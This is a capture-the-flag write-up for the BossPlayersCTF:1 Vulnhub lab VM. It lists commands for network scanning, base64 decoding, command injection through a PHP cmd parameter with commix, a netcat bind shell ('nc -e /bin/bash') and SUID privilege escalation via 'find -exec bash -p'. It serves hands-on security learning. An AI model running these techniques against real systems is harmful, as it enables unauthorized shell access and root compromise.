# WU_bossplayersCTF1-Vulnhub
Write Up BossPlayersCTF:1 VM Vulnhub

## Netdiscover
`sudo netdiscover -r 192.168.87.0/24`

![github-small](https://github.com/bielnzar/WU_bossplayersCTF1-Vulnhub/blob/main/assets/netdiscover-2.png)

## nmap
`sudo nmap 192.168.87.4 -A -p- -oN log-nmap.log`

![github-small](https://github.com/bielnzar/WU_bossplayersCTF1-Vulnhub/blob/main/assets/nmap.png)

## HTTP
`http://192.168.87.4/`

![github-small](https://github.com/bielnzar/WU_bossplayersCTF1-Vulnhub/blob/main/assets/http.png)

## robots.txt file
`http://192.168.87.4/robots.txt`

![github-small](https://github.com/bielnzar/WU_bossplayersCTF1-Vulnhub/blob/main/assets/robots-txt.png)

## Decode Password
`echo bG9sIHRyeSBoYXJkZXIgYnJvCg== | base64 -d`

![github-small](https://github.com/bielnzar/WU_bossplayersCTF1-Vulnhub/blob/main/assets/decode.png)

## Source Code of the initial webpage
`Ctrl + U`

`WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK`

![github-small](https://github.com/bielnzar/WU_bossplayersCTF1-Vulnhub/blob/main/assets/ctrl-u.png)

## Decode Again
```
1. echo WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK | base64 -d
2. echo WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK | base64 -d | base64 -d
3. echo WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK | base64 -d | base64 -d | base64 -d

```

![github-small](https://github.com/bielnzar/WU_bossplayersCTF1-Vulnhub/blob/main/assets/decode-2.png)

## PHP File 
`http://192.168.87.4/workinginprogress.php`

![github-small](https://github.com/bielnzar/WU_bossplayersCTF1-Vulnhub/blob/main/assets/url-1.png)

## Whoami URL
`http://192.168.87.4/workinginprogress.php?cmd=whoami`

![github-small](https://github.com/bielnzar/WU_bossplayersCTF1-Vulnhub/blob/main/assets/url-2.png)

## Commix
`commix -u 'http://192.168.87.4/workinginprogress.php?cmd=whoami'`
```
nc -e /bin/bash -lvp 2048
```

![github-small](https://github.com/bielnzar/WU_bossplayersCTF1-Vulnhub/blob/main/assets/commix.png)

## Netcat
`nc 192.168.87.4 2048`

```
uname -a

find / -perm -4000 -type f 2>/dev/null
```

![github-small](https://github.com/bielnzar/WU_bossplayersCTF1-Vulnhub/blob/main/assets/nc.png)

## Privilege Escalation
```
find -exec bash -p \;
whoami
ls -al /root
cat /root/root.txt
cat /root/root.txt | base64 -d
```

![github-small](https://github.com/bielnzar/WU_bossplayersCTF1-Vulnhub/blob/main/assets/nc-2.png)
